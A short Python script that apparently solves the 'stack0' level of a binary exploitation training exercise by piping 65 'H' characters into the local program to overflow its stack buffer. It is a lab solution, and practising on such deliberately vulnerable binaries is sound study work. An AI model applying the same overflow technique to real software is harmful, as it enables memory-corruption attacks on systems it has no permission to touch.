#!/usr/bin/python

from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()

BINARY_NAME = "stack0"


def main():
    # LOCAL VARIABLES
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    payload = "H" * 65
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # RUN IT
    commandList.append(absBinFilename)
    binary = Popen(commandList, stdin = PIPE)
    if binary is not None:
        binary.communicate(payload)

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))
